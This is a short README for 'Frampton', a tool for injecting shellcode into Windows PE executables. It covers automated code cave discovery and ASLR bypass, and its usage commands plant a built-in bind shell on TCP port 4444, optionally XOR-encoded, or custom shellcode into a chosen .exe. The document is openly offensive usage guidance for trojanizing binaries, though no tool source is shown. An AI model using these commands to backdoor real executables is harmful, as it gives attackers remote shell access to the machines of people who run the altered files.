# Frampton
PE Binary Shellcode Injector - Automated code cave discovery, shellcode injection, ASLR bypass

## Install
`pip3 install -r requirements.txt`

## Usage
#### Built-in basic bind shell (TCP 4444) 
```./frampton.py -f FILENAME.exe```

#### Built-in basic bind shell (TCP 4444) with XOR encoder
```./frampton.py -f FILENAME.exe -e```

#### Custom Shellcode Injector 
```./frampton.py -f FILENAME.exe -s "\xSH\xEL\xCO\xDE\xHE\xRE```
